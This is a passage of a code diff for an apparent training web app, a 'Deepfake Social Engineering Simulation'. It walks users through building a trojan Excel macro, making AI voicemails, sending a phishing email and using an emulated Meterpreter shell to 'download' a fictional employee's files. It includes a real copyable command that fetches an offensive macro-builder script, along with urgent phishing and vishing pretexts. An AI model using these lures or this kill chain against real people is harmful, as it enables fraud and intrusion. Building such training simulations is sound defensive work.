@@ -7,6 +7,7 @@ require_login();
 
 const CONSOLE_STATE_KEY = 'mission_console';
 const PAYLOAD_CONSOLE_KEY = 'payload_console';
+const METERPRETER_STATE_KEY = 'meterpreter_console';
 const PAYLOAD_REQUIRED_IP = '35.233.136.83';
 const PAYLOAD_IWR_URI = 'https://raw.githubusercontent.com/enigma0x3/Generate-Macro/refs/heads/master/Generate-Macro.ps1';
 const LISTENER_STATE_KEY = 'listener_console';
@@ -156,7 +157,64 @@ function payload_default_state(): array
         'macro' => payload_macro_template(),
         'trojan' => null,
         'complete' => false,
+        'phish' => [
+            'sent' => false,
+            'to' => null,
+            'subject' => null,
+            'body' => null,
+            'attachment' => null,
+            'timestamp' => null,
+            'call_sent' => false,
+            'call_timestamp' => null,
+            'call_script' => null,
+            'call_voicemail' => null,
+        ],
     ];
+}
+
+function meterpreter_default_state(): array
+{
+    return [
+        'active' => false,
+        'history' => [],
+        'cwd' => 'C:\\Users\\jdoe\\Desktop',
+        'files' => [
+            'Desktop.ini' => ['type' => 'fil', 'size' => 282, 'meta' => '100644/rw-r--r--', 'modified' => '2025-11-18 07:22:10 -0800'],
+            'Quarterly-Forecast.xlsx' => ['type' => 'fil', 'size' => 845312, 'meta' => '100660/rw-rw----', 'modified' => '2025-11-25 08:14:02 -0800'],
+            'Invoices' => ['type' => 'dir', 'size' => 0, 'meta' => '040775/rwxrwxr-x', 'modified' => '2025-11-24 17:48:55 -0800'],
+            'Sensitive-Financials.xlsx' => ['type' => 'fil', 'size' => 512480, 'meta' => '100600/rw-------', 'modified' => '2025-11-25 09:32:41 -0800'],
+            'Vendor-Contracts' => ['type' => 'dir', 'size' => 0, 'meta' => '040755/rwxr-xr-x', 'modified' => '2025-11-19 13:07:18 -0800'],
+            'CEO-Briefing.docx' => ['type' => 'fil', 'size' => 129024, 'meta' => '100660/rw-rw----', 'modified' => '2025-11-21 11:02:33 -0800'],
+        ],
+    ];
+}
+
+function meterpreter_state(): array
+{
+    if (!isset($_SESSION[METERPRETER_STATE_KEY])) {
+        $_SESSION[METERPRETER_STATE_KEY] = meterpreter_default_state();
+    }
+    return $_SESSION[METERPRETER_STATE_KEY];
+}
+
+function meterpreter_save_state(array $state): void
+{
+    $_SESSION[METERPRETER_STATE_KEY] = $state;
+}
+
+function payload_available_attachments(array $state): array
+{
+    $files = $state['files'] ?? [];
+    if (!empty($state['download_name'])) {
+        $files[] = $state['download_name'];
+    }
+    if (!empty($state['trojan'])) {
+        $files[] = $state['trojan'];
+    }
+
+    $files = array_filter($files, static fn ($name) => is_string($name) && trim($name) !== '');
+
+    return array_values(array_unique($files));
 }
 
 function payload_state(): array
@@ -509,7 +567,7 @@ function payload_handle_command(string $command, array $state): array
             $output = "Available commands:
   help                   Show this list
   ls / pwd               Inspect working directory
-  ipconfig               Display adapter information
+  Invoke-RestMethod      Retrieve the public IPv4
   Invoke-WebRequest      Download Generate-Macro.ps1
   .\\Generate-Macro.ps1  Launch the macro builder
   reset                  Restore the lab state
@@ -539,20 +597,8 @@ function payload_handle_command(string $command, array $state): array
             $state['files'] = $files;
             $output = implode("\n", $files);
             break;
-        case strcasecmp($command, 'ipconfig') === 0:
-            $output = <<<EOT
-
-Windows IP Configuration
-
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . :
-   Link-local IPv6 Address . . . . . : fe80::cc0f:abcd:ef12:3456%12
-   IPv4 Address. . . . . . . . . . . : {PAYLOAD_REQUIRED_IP}
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 35.233.136.1
-EOT;
-            $output = str_replace('{PAYLOAD_REQUIRED_IP}', PAYLOAD_REQUIRED_IP, $output);
+        case preg_match('/^Invoke-RestMethod\s+-Uri\s+("?)(http:\/\/ipinfo\.io\/ip)\1$/i', $command) === 1:
+            $output = PAYLOAD_REQUIRED_IP;
             break;
         case stripos($command, 'Invoke-WebRequest') === 0:
             $uriMatch = [];
@@ -618,7 +664,7 @@ EOT;
             )));
             $state['files'] = $files;
             if (strcasecmp($normalizedTarget, 'Readme.txt') === 0) {
-                $output = "Recon Checklist:\n - Confirm IP via ipconfig\n - Pull Generate-Macro.ps1\n - Run the builder.\n";
+                $output = "Recon Checklist:\n - Confirm IP via Invoke-RestMethod -Uri http://ipinfo.io/ip\n - Pull Generate-Macro.ps1\n - Run the builder.\n";
             } elseif ($state['downloaded'] && strcasecmp($normalizedTarget, ($state['download_name'] ?? 'Generate-Macro.ps1')) === 0) {
                 $output = payload_macro_source();
             } elseif ($state['trojan'] && strcasecmp($normalizedTarget, $state['trojan']) === 0) {
@@ -652,7 +698,7 @@ function payload_handle_macro_input(string $command, array $state): array
     switch ($step) {
         case 'ip':
             if ($command !== PAYLOAD_REQUIRED_IP) {
-                $output = "Invalid IP. Run ipconfig and enter {$state['cwd']} host address:";
+                $output = "Invalid IP. Run Invoke-RestMethod -Uri http://ipinfo.io/ip and enter {$state['cwd']} host address:";
                 $promptAgain = true;
                 $promptText = payload_prompt_for_step($step);
                 break;
@@ -934,6 +980,209 @@ function listener_start_handler(array $state): array
     ];
 }
 
+function meterpreter_handle_command(string $command, array $state, array $phishState): array
+{
+    $command = trim($command);
+    $output = '';
+    $clear = false;
+
+    if (!($phishState['sent'] ?? false) || !($phishState['call_sent'] ?? false)) {
+        return [
+            'state' => $state,
+            'output' => "Waiting for the target to open the workbook. Send the phishing email and voicemail first.",
+            'clear' => false,
+        ];
+    }
+
+    if (!$state['active']) {
+        $state['active'] = true;
+        $output = "[*] Sending stage (24772 bytes) to 127.0.0.1\r\n"
+            . "[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:36552) at "
+            . date('Y-m-d H:i:s T') . "\r\n"
+            . "[*] Starting interaction with 1...\r\n";
+        if ($command === '') {
+            return [
+                'state' => $state,
+                'output' => $output,
+                'clear' => false,
+            ];
+        }
+    }
+
+    if ($command === '') {
+        return [
+            'state' => $state,
+            'output' => '',
+            'clear' => false,
+        ];
+    }
+
+    switch (true) {
+        case $command === 'help':
+            $output = "Core commands:\r\n  getuid\r\n  ls\r\n  pwd\r\n  download <file>\r\n  clear";
+            break;
+        case $command === 'clear':
+        case $command === 'cls':
+            $clear = true;
+            $output = 'Screen cleared.';
+            break;
+        case $command === 'getuid':
+            $output = 'Server username: jdoe';
+            break;
+        case $command === 'pwd':
+            $output = $state['cwd'];
+            break;
+        case $command === 'ls':
+            $lines = [
+                "Listing: {$state['cwd']}",
+                str_repeat('=', 44),
+                '',
+                "Mode              Size   Type  Last modified              Name",
+                "----              ----   ----  -------------              ----",
+            ];
+            foreach ($state['files'] as $name => $info) {
+                $lines[] = sprintf(
+                    '%-16s %-6s %-5s %-26s %s',
+                    $info['meta'],
+                    number_format($info['size']),
+                    $info['type'],
+                    $info['modified'],
+                    $name
+                );
+            }
+            $output = implode("\r\n", $lines);
+            break;
+        case preg_match('/^download\s+(.+)/i', $command, $m) === 1:
+            $file = trim($m[1], '"\'');
+            if ($file === '') {
+                $output = 'Usage: download <filename>';
+                break;
+            }
+            if (!array_key_exists($file, $state['files'])) {
+                $output = "[-] File {$file} not found on target.";
+                break;
+            }
+            $targetPath = "/home/kali/tmp/{$file}";
+            $output = "[*] Downloading: {$file} -> {$targetPath}\r\n"
+                . "[*] Downloaded 3.33 KiB of 3.33 KiB (100.0%): {$file} -> {$targetPath}\r\n"
+                . "[*] Completed  : {$file} -> {$targetPath}";
+            break;
+        default:
+            $output = "meterpreter: Unknown command '{$command}'.";
+            break;
+    }
+
+    return [
+        'state' => $state,
+        'output' => $output,
+        'clear' => $clear,
+    ];
+}
+
+function phish_handle_submission(array $input, array $state): array
+{
+    $to = trim($input['to'] ?? '');
+    $subject = trim($input['subject'] ?? '');
+    $body = trim($input['body'] ?? '');
+    $attachment = trim($input['attachment'] ?? '');
+    $availableAttachments = payload_available_attachments($state);
+    $errors = [];
+
+    if (strcasecmp($to, 'jdoe@zegodefense.com') !== 0) {
+        $errors[] = 'Target alias mismatch. Only the Zego Defense finance inbox is authorized.';
+    }
+    if (!$availableAttachments) {
+        $errors[] = 'No files available to attach. Generate a workbook first.';
+    }
+    if ($attachment === '') {
+        $errors[] = 'Select an attachment before sending.';
+    } elseif (!in_array($attachment, $availableAttachments, true)) {
+        $errors[] = 'Attachment not recognized in the staging directory.';
+    }
+    if ($subject === '') {
+        $errors[] = 'Subject line cannot be empty.';
+    }
+    if (mb_strlen($body) < 60) {
+        $errors[] = 'Message needs more urgency and context (minimum ~60 characters).';
+    }
+
+    if ($errors) {
+        return [
+            'state' => $state,
+            'success' => false,
+            'message' => implode(' ', $errors),
+        ];
+    }
+
+    $sentAt = time();
+    $state['phish'] = [
+        'sent' => true,
+        'to' => $to,
+        'subject' => $subject,
+        'body' => $body,
+        'attachment' => $attachment,
+        'timestamp' => $sentAt,
+        'call_sent' => $state['phish']['call_sent'] ?? false,
+        'call_timestamp' => $state['phish']['call_timestamp'] ?? null,
+        'call_script' => $state['phish']['call_script'] ?? null,
+    ];
+
+    $details = [
+        'to' => $to,
+        'subject' => $subject,
+        'attachment' => $attachment,
+        'sent_label' => date('M j, Y g:i a T', $sentAt),
+    ];
+
+    return [
+        'state' => $state,
+        'success' => true,
+        'message' => "Dispatch queued via secure relay to {$to}. Attachment {$attachment} is en route.",
+        'details' => $details,
+    ];
+}
+
+function phish_handle_call(array $input, array $state): array
+{
+    $script = trim($input['script'] ?? '');
+    if ($script === '') {
+        $script = "Hi John, this is Lain following up on the voicemail. Please open the workbook we just sent and process Scenario B before the market opens.";
+    }
+    $voicemailLabel = trim($input['voicemail_label'] ?? '');
+    if (!($state['phish']['sent'] ?? false)) {
+        return [
+            'state' => $state,
+            'success' => false,
+            'message' => 'Send the phishing email before leaving the voicemail trail.',
+        ];
+    }
+    if ($voicemailLabel === '') {
+        return [
+            'state' => $state,
+            'success' => false,
+            'message' => 'Select a generated voicemail before calling the target.',
+        ];
+    }
+
+    $callTimestamp = time();
+    $state['phish']['call_sent'] = true;
+    $state['phish']['call_timestamp'] = $callTimestamp;
+    $state['phish']['call_script'] = $script;
+    $state['phish']['call_voicemail'] = $voicemailLabel;
+
+    return [
+        'state' => $state,
+        'success' => true,
+        'message' => 'Voicemail drop completed. Target mailbox received the audio lure.',
+        'details' => [
+            'script' => $script,
+            'timestamp' => date('M j, Y g:i a T', $callTimestamp),
+            'voicemail_label' => $voicemailLabel,
+            'script' => $script,
+        ],
+    ];
+}
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json');
     $command = $_POST['command'] ?? '';
@@ -942,10 +1191,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $state = payload_state();
         $result = payload_handle_command($command, $state);
         payload_save_state($result['state']);
+    } elseif ($target === 'payload_refresh') {
+        $state = payload_state();
+        echo json_encode(['files' => payload_available_attachments($state)]);
+        exit;
+    } elseif ($target === 'phish') {
+        $state = payload_state();
+        $result = phish_handle_submission($_POST, $state);
+        $newState = $result['state'];
+        unset($result['state']);
+        payload_save_state($newState);
+        echo json_encode($result);
+        exit;
+    } elseif ($target === 'phish_call') {
+        $state = payload_state();
+        $result = phish_handle_call($_POST, $state);
+        $newState = $result['state'];
+        unset($result['state']);
+        payload_save_state($newState);
+        echo json_encode($result);
+        exit;
     } elseif ($target === 'listener') {
         $state = listener_state();
         $result = listener_handle_command($command, $state);
         listener_save_state($result['state']);
+    } elseif ($target === 'meterpreter') {
+        $meterpreter = meterpreter_state();
+        $phishState = payload_state()['phish'] ?? [];
+        $result = meterpreter_handle_command($command, $meterpreter, $phishState);
+        meterpreter_save_state($result['state']);
     } else {
         $state = console_state();
         $result = handle_console_command($command, $state);
@@ -979,16 +1253,34 @@ $defaultSpeakingRate = $defaultVoiceConfig['speaking_rate'] ?? 1.0;
 $defaultPitch = $defaultVoiceConfig['pitch'] ?? 0.0;
 $defaultEncoding = strtoupper($defaultVoiceConfig['audio_encoding'] ?? 'MP3');
 $defaultEffectsProfile = $defaultVoiceConfig['effects_profile'] ?? 'telephony-class-application';
+$attachmentOptions = payload_available_attachments($payloadState);
+$trojanAttachment = $payloadState['trojan'] ?? null;
+$phishState = $payloadState['phish'] ?? ['sent' => false];
+$defaultPhishSubject = $phishState['subject'] ?? 'Updated Earnings Workbook - Action Required';
+$defaultPhishBody = $phishState['body'] ?? "Hi John,\n\nAttaching the revised earnings workbook that aligns with the voicemail we just left. Leadership wants this pushed through before the market opens, so please open the spreadsheet, validate the Scenario B tab, and reply once complete.\n\nThanks,\nLain";
+$defaultAttachmentChoice = $phishState['attachment'] ?? ($trojanAttachment ?? ($attachmentOptions[0] ?? ''));
+$callSent = $phishState['call_sent'] ?? false;
+$callTimestamp = $phishState['call_timestamp'] ?? null;
+$defaultCallScript = $phishState['call_script'] ?? "John, this is Lain from Strategy. The workbook I emailed a moment ago needs sign-off before the bell. Open {$defaultAttachmentChoice} and approve Scenario B so we can brief the CEO.";
+$meterpreterReady = ($phishState['sent'] ?? false) && ($phishState['call_sent'] ?? false);
 
 render_header('Simulation Lab');
 ?>
 <section class="panel">
     <h1>Deepfake Social Engineering Simulation</h1>
     <p>
-        This laboratory walks through the entire kill-chain of a synthetic social engineering campaign:
-        weaponize a Trojan Excel payload using PowerShell tooling, then craft believable AI-generated voicemails
-        to pressure the target into opening it. Completing both modules helps analysts rehearse the signals
-        defenders look for when deepfake voice and malware delivery converge.
+        This simulation walks through the entire kill-chain of a deepfake social engineering campaign. You will be asked to complete a series of tasks in order to
+        to obtain a meterpreter reverse shell on a target's workstation.
+        <br>
+        <br><b>Task 1</b>&nbsp;&nbsp;&nbsp;&nbsp; Prepare Payload: weaponize a Trojan Excel payload using PowerShell tooling
+        <br><b>Task 2</b>&nbsp;&nbsp;&nbsp;&nbsp; Generate Voicemail: craft believable AI-generated voicemails to pressure the target into opening it
+        <br><b>Task 3</b>&nbsp;&nbsp;&nbsp;&nbsp; Start Listener: start a meterpreter listener to catch the reverse shell
+        <br><b>Task 4</b>&nbsp;&nbsp;&nbsp;&nbsp; Deliver the Phish: craft a phishing email with the trojan attachment and send the email and voicemail to target
+        <br><b>Task 5</b>&nbsp;&nbsp;&nbsp;&nbsp; Catch the Shell: obtain Remote Code Execution (RCE) on the target's workstation and download the sensitive files.
+        <div class="intro-scale-note">
+            <span role="img" aria-label="warning">⚠️</span>
+            In this example only one target is used, but the advantage of synthetic media is that it can be easily scaled to thousands of targets.
+        </div>
     </p>
 </section>
 
@@ -1004,17 +1296,17 @@ render_header('Simulation Lab');
             <li>
                 Run
                 <span class="copyable-command">
-                    <code class="command-hint">ipconfig</code>
-                    <button type="button" class="copy-cmd" data-command="ipconfig" aria-label="Copy ipconfig command">⧉</button>
+                    <code class="command-hint">Invoke-RestMethod -Uri http://ipinfo.io/ip</code>
+                    <button type="button" class="copy-cmd" data-command="Invoke-RestMethod -Uri http://ipinfo.io/ip" aria-label="Copy public IP lookup command">⧉</button>
                 </span>
-                to confirm the IPv4 address.
+                to retrieve the host's public IPv4 address.
             </li>
             <li>
-                Download the macro builder with
+                Download the macro builder with:
                 <span class="copyable-command">
                     <code class="command-hint">Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1</code>
                     <button type="button" class="copy-cmd" data-command="Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1" aria-label="Copy Invoke-WebRequest command">⧉</button>
-                </span>.
+                </span>
             </li>
             <li>
                 Launch
@@ -1022,7 +1314,7 @@ render_header('Simulation Lab');
                     <code class="command-hint">.\Generate-Macro.ps1</code>
                     <button type="button" class="copy-cmd" data-command=".\Generate-Macro.ps1" aria-label="Copy macro launch command">⧉</button>
                 </span>
-                and provide the IP, port, document name, attack, and payload selections.
+                and provide the IP, port, document name (e.g. <code class="command-hint">Zego Budget Forecast Q1 2026</code>), attack, and payload selections.
             </li>
         </ol>
     </div>
@@ -1031,7 +1323,7 @@ render_header('Simulation Lab');
             <span class="indicator"></span>
             <span class="indicator yellow"></span>
             <span class="indicator green"></span>
-            <span class="terminal-title">payload-node</span>
+            <span class="terminal-title">Windows Dev Host</span>
         </div>
         <div id="payload-terminal" class="terminal-window" aria-label="Payload terminal"></div>
     </div>
@@ -1042,7 +1334,10 @@ render_header('Simulation Lab');
         <h2>Generate Voicemail</h2>
         <p>
             Feed the AI voice actor with your own script to simulate phishing voicemails.
-            We use Google Cloud Text-to-Speech, so make sure your account is permitted to call the API.
+            <span class="voicemail-warning intro-scale-note">
+                <span role="img" aria-label="warning">⚠️</span>
+                Vishing pressure dramatically increases phishing success because hearing a confident voice lowers skepticism and shortens the victim's response window.
+            </span>
         </p>
     </div>
     <form id="voicemail-form" class="voicemail-form">
@@ -1115,6 +1410,12 @@ render_header('Simulation Lab');
         </div>
         <audio id="voicemail-audio" controls hidden></audio>
     </form>
+    <div class="voicemail-library-card">
+        <h3>Saved voicemails</h3>
+        <ul id="voicemail-library-list">
+            <li><em>No voicemails generated yet.</em></li>
+        </ul>
+    </div>
 </section>
 <section class="panel">
     <div>
@@ -1135,14 +1436,207 @@ render_header('Simulation Lab');
             <span class="indicator"></span>
             <span class="indicator yellow"></span>
             <span class="indicator green"></span>
-            <span class="terminal-title">kali-listener</span>
+            <span class="terminal-title">Kali Attack Host</span>
         </div>
         <div id="listener-terminal" class="terminal-window" aria-label="Listener terminal"></div>
     </div>
 </section>
+<section class="panel phish-panel">
+    <div>
+        <h2>Deliver the Phish</h2>
+        <p>
+            With the payload staged and listener armed, send a high-pressure email that references the voicemail
+            and slips the malicious spreadsheet to <code class="command-hint">jdoe@zegodefense.com</code>.
+        </p>
+        <ol>
+            <li>Reinforce the voicemail narrative and request immediate action on the attached workbook.</li>
+            <li>Select the staged file from <code class="command-hint">C:\Users\Deep\Desktop\</code> using the attachment picker so the target trusts it.</li>
+            <li>Send only when the listener is waiting; you should be ready to catch the callback.</li>
+        </ol>
+    </div>
+    <div class="phish-card">
+        <form id="phishing-form" class="phish-form">
+            <label>
+                To
+                <input type="email" name="to" value="jdoe@zegodefense.com" readonly>
+            </label>
+            <label>
+                Subject
+                <input type="text" name="subject" value="<?= h($defaultPhishSubject) ?>" required>
+            </label>
+            <label>
+                Message
+                <textarea name="body" rows="7" required><?= h($defaultPhishBody) ?></textarea>
+            </label>
+            <label>
+                Attachment
+                <select name="attachment" id="phish-attachment-select" required data-default="<?= h($defaultAttachmentChoice) ?>">
+                    <?php foreach ($attachmentOptions as $fileName): ?>
+                        <option value="<?= h($fileName) ?>" <?= $fileName === $defaultAttachmentChoice ? 'selected' : '' ?>>
+                            <?= h($fileName) ?>
+                        </option>
+                    <?php endforeach; ?>
+                </select>
+                <small>Files sourced from <code>C:\Users\Deep\Desktop\</code></small>
+                <span id="phish-attachment-status" class="voicemail-status"></span>
+            </label>
+            <div class="phish-actions">
+                <button type="submit" <?= $attachmentOptions ? '' : 'disabled' ?>>Send phishing email</button>
+                <span id="phishing-status" class="voicemail-status" aria-live="polite"></span>
+            </div>
+        </form>
+        <div id="phishing-log" class="phish-log">
+            <?php if (!empty($phishState['sent'])): ?>
+                <strong>Last delivery</strong>
+                <p><?= h(date('M j, Y g:i a T', $phishState['timestamp'] ?? time())) ?> → <?= h($phishState['to']) ?></p>
+                <p><em>Subject:</em> <?= h($phishState['subject']) ?></p>
+                <p><em>Attachment:</em> <?= h($phishState['attachment']) ?></p>
+            <?php else: ?>
+                <em>No phishing email sent yet.</em>
+            <?php endif; ?>
+        </div>
+    </div>
+    <div class="phish-voice-card">
+        <h3>Drop the Voicemail</h3>
+        <p>
+            Trigger the follow-up call that references your email. This emulator replays the script you provide,
+            ensuring the voicemail matches the written pretext.
+        </p>
+        <label>
+            Select voicemail
+            <select id="phish-voicemail-select" disabled>
+                <option value="">No voicemails generated yet</option>
+            </select>
+        </label>
+        <audio id="phish-voicemail-audio" controls hidden></audio>
+        <div class="phish-actions">
+            <button type="button" id="phish-call-button" <?= $phishState['sent'] ? '' : 'disabled' ?>>Send vishing voicemail</button>
+            <span id="phish-call-status" class="voicemail-status" aria-live="polite">
+                <?= $callSent && $callTimestamp ? 'Last call: ' . h(date('M j, Y g:i a T', $callTimestamp)) : ($phishState['sent'] ? 'Ready to call once the line is free.' : 'Send the email before placing the call.') ?>
+            </span>
+        </div>
+        <div id="phish-call-log" class="phish-log">
+            <?php if ($callSent && $callTimestamp): ?>
+                <strong>Most recent voicemail</strong>
+                <p><?= h(date('M j, Y g:i a T', $callTimestamp)) ?></p>
+                <?php if (!empty($phishState['call_voicemail'])): ?>
+                    <p><em>Clip:</em> <?= h($phishState['call_voicemail']) ?></p>
+                <?php endif; ?>
+                <p><?= nl2br(h($phishState['call_script'] ?? $defaultCallScript)) ?></p>
+            <?php else: ?>
+                <em>No voicemail has been recorded yet.</em>
+            <?php endif; ?>
+        </div>
+    </div>
+</section>
+<section class="panel">
+    <div>
+        <h2>Catch the Shell</h2>
+        <p>
+            Once the target opens the malicious workbook, the staged listener hands you a Meterpreter console.
+            Use it to validate that your payload executed successfully and run <code class="command-hint">download &lt;filename&gt;</code> to exfiltrate sensitive files from <code class="command-hint">C:\Users\jdoe\Desktop</code>.
+        </p>
+        <div class="meterpreter-refresh">
+            <button type="button" id="meterpreter-refresh-button">Refresh meterpreter panel</button>
+            <small class="command-hint">Use if the terminal still shows the waiting message.</small>
+        </div>
+    </div>
+    <?php if ($meterpreterReady): ?>
+        <div class="terminal-card">
+            <div class="terminal-toolbar">
+                <span class="indicator"></span>
+                <span class="indicator yellow"></span>
+                <span class="indicator green"></span>
+                <span class="terminal-title">Kali Attack Host</span>
+            </div>
+            <div id="meterpreter-terminal" class="terminal-window" aria-label="Meterpreter terminal"></div>
+        </div>
+    <?php else: ?>
+        <div class="phish-attachment missing">
+            <strong>Listener armed:</strong> send both the phishing email and the voicemail to trigger the callback.
+        </div>
+    <?php endif; ?>
+</section>
 <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
 <script>
+document.addEventListener('DOMContentLoaded', () => {
+    const warnBlocks = document.querySelectorAll('.intro-scale-note');
+    warnBlocks.forEach((note) => {
+        note.style.display = 'flex';
+        note.style.alignItems = 'center';
+        note.style.gap = '0.4rem';
+        note.style.margin = '1rem auto 0';
+        note.style.padding = '0.5rem 0.8rem';
+        note.style.backgroundColor = 'rgba(255, 236, 150, 0.35)';
+        note.style.borderRadius = '6px';
+        note.style.fontWeight = '300';
+        note.style.fontSize = '0.9rem';
+        note.style.color = '#ffd500';
+        note.style.lineHeight = '1.4';
+        note.style.border = '1px solid #ffd500';
+        note.style.justifyContent = 'center';
+        note.style.whiteSpace = 'nowrap';
+        note.style.width = 'fit-content';
+    });
+});
+const VOICEMAIL_STORAGE_KEY = 'dft_voicemail_bank';
+const MAX_VOICEMAILS = 10;
+const MAX_VOICEMAIL_SECONDS = 45;
+
+const loadVoicemailBank = () => {
+    if (!window.localStorage) return [];
+    try {
+        const raw = window.localStorage.getItem(VOICEMAIL_STORAGE_KEY);
+        if (!raw) return [];
+        const parsed = JSON.parse(raw);
+        if (!Array.isArray(parsed)) return [];
+        return parsed.filter((entry) => entry && entry.id && entry.src);
+    } catch {
+        return [];
+    }
+};
+
+const saveVoicemailBank = (bank) => {
+    if (!window.localStorage) return;
+    try {
+        window.localStorage.setItem(VOICEMAIL_STORAGE_KEY, JSON.stringify(bank.slice(-MAX_VOICEMAILS)));
+    } catch {
+        // ignore storage errors
+    }
+};
+
+window.__voicemailBank = loadVoicemailBank();
+
+async function ensureVoicemailWithinLimits(src) {
+    try {
+        const response = await fetch(src);
+        const blob = await response.blob();
+        if (blob.size <= MAX_VOICEMAIL_SECONDS * 16_000) {
+            return {src};
+        }
+        const trimmedBuffer = await blob.arrayBuffer();
+        const maxBytes = MAX_VOICEMAIL_SECONDS * 16_000;
+        const truncated = trimmedBuffer.slice(0, maxBytes);
+        const truncatedBlob = new Blob([truncated], {type: blob.type});
+        return new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                resolve({src: reader.result});
+            };
+            reader.readAsDataURL(truncatedBlob);
+        });
+    } catch {
+        return {src};
+    }
+}
+
+const buildVoicemailEntry = (src, descriptor, script) => ({
+    id: `vm-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    label: `${descriptor} · ${new Date().toLocaleTimeString()}`,
+    src,
+    script,
+});
 (() => {
     const form = document.getElementById('voicemail-form');
     if (!form) return;
@@ -1156,6 +1650,112 @@ render_header('Simulation Lab');
     const pitchInput = document.getElementById('voicemail-pitch');
     const encodingSelect = document.getElementById('voicemail-encoding');
     const effectsSelect = document.getElementById('voicemail-effects');
+    const libraryList = document.getElementById('voicemail-library-list');
+    const voicemailSelect = document.getElementById('phish-voicemail-select');
+    const voicemailAudio = document.getElementById('phish-voicemail-audio');
+    const voicemailBank = (window.__voicemailBank = window.__voicemailBank || []);
+
+    const selectVoicemail = (id) => {
+        if (!voicemailSelect) return;
+        voicemailSelect.value = id;
+        const event = new Event('change');
+        voicemailSelect.dispatchEvent(event);
+    };
+
+    const renderVoicemailLibrary = () => {
+        if (!libraryList) return;
+        libraryList.innerHTML = '';
+        if (voicemailBank.length === 0) {
+            const li = document.createElement('li');
+            li.innerHTML = '<em>No voicemails generated yet.</em>';
+            libraryList.appendChild(li);
+            return;
+        }
+        voicemailBank.forEach((entry) => {
+            const li = document.createElement('li');
+            const entryWrap = document.createElement('div');
+            entryWrap.className = 'voicemail-library-entry';
+            const labelSpan = document.createElement('span');
+            labelSpan.className = 'voicemail-library-label';
+            labelSpan.textContent = entry.label;
+            const audioInline = document.createElement('audio');
+            audioInline.controls = true;
+            audioInline.className = 'voicemail-library-audio';
+            audioInline.preload = 'metadata';
+            audioInline.src = entry.src;
+            audioInline.addEventListener('play', () => selectVoicemail(entry.id));
+            labelSpan.addEventListener('click', () => audioInline.play());
+            const controlsRow = document.createElement('div');
+            controlsRow.className = 'voicemail-library-controls';
+            const deleteLink = document.createElement('a');
+            deleteLink.href = '#';
+            deleteLink.className = 'voicemail-delete-link';
+            deleteLink.textContent = 'delete';
+            deleteLink.addEventListener('click', (evt) => {
+                evt.preventDefault();
+                const index = voicemailBank.findIndex((vm) => vm.id === entry.id);
+                if (index >= 0) {
+                    voicemailBank.splice(index, 1);
+                    saveVoicemailBank(voicemailBank);
+                    renderVoicemailLibrary();
+                    syncVoicemailSelect();
+                }
+            });
+            controlsRow.appendChild(audioInline);
+            controlsRow.appendChild(deleteLink);
+            entryWrap.appendChild(labelSpan);
+            entryWrap.appendChild(controlsRow);
+            li.appendChild(entryWrap);
+            libraryList.appendChild(li);
+        });
+    };
+
+    const syncVoicemailSelect = (selectedId = '') => {
+        if (!voicemailSelect) return;
+        voicemailSelect.innerHTML = '';
+        if (voicemailBank.length === 0) {
+            const option = document.createElement('option');
+            option.value = '';
+            option.textContent = 'No voicemails generated yet';
+            voicemailSelect.appendChild(option);
+            voicemailSelect.disabled = true;
+            if (voicemailAudio) {
+                voicemailAudio.hidden = true;
+            }
+            return;
+        }
+        voicemailSelect.disabled = false;
+        voicemailBank.forEach((entry, index) => {
+            const option = document.createElement('option');
+            option.value = entry.id;
+            option.textContent = entry.label;
+            if ((selectedId && entry.id === selectedId) || (!selectedId && index === voicemailBank.length - 1)) {
+                option.selected = true;
+            }
+            voicemailSelect.appendChild(option);
+        });
+        const activeId = voicemailSelect.value;
+        const activeEntry = voicemailBank.find((vm) => vm.id === activeId);
+        if (activeEntry && voicemailAudio) {
+            voicemailAudio.hidden = false;
+            voicemailAudio.src = activeEntry.src;
+        }
+    };
+
+    renderVoicemailLibrary();
+    syncVoicemailSelect();
+
+    voicemailSelect?.addEventListener('change', () => {
+        if (!voicemailSelect) return;
+        const selectedId = voicemailSelect.value;
+        const entry = voicemailBank.find((vm) => vm.id === selectedId);
+        if (entry && voicemailAudio) {
+            voicemailAudio.hidden = false;
+            voicemailAudio.src = entry.src;
+        } else if (voicemailAudio) {
+            voicemailAudio.hidden = true;
+        }
+    });
 
     const applyPresetSettings = () => {
         if (!voiceSelect) return;
@@ -1211,16 +1811,27 @@ render_header('Simulation Lab');
             body: new URLSearchParams(payload),
         })
             .then((resp) => resp.json())
-            .then((data) => {
+            .then(async (data) => {
                 if (data.error) {
                     statusEl.textContent = data.error;
                     return;
                 }
-                const src = `data:${data.mime};base64,${data.audio}`;
-                audioEl.src = src;
+                const option = voiceSelect?.options[voiceSelect.selectedIndex];
+                const descriptor = option?.dataset.description || option?.textContent || 'Custom voice';
+                const processResult = await ensureVoicemailWithinLimits(`data:${data.mime};base64,${data.audio}`);
+                const finalSrc = processResult.src;
+                audioEl.src = finalSrc;
                 audioEl.hidden = false;
                 audioEl.play().catch(() => {});
                 statusEl.textContent = 'Voicemail ready.';
+                const entry = buildVoicemailEntry(finalSrc, descriptor, script);
+                voicemailBank.push(entry);
+                if (voicemailBank.length > MAX_VOICEMAILS) {
+                    voicemailBank.splice(0, voicemailBank.length - MAX_VOICEMAILS);
+                }
+                saveVoicemailBank(voicemailBank);
+                renderVoicemailLibrary();
+                syncVoicemailSelect(entry.id);
             })
             .catch(() => {
                 statusEl.textContent = 'Unable to reach the TTS service.';
@@ -1232,15 +1843,373 @@ render_header('Simulation Lab');
 })();
 
 (() => {
+    const attachmentSelect = document.getElementById('phish-attachment-select');
+    const attachmentStatus = document.getElementById('phish-attachment-status');
+    if (!attachmentSelect) return;
+
+    attachmentSelect.addEventListener('focus', () => {
+        if (attachmentStatus) {
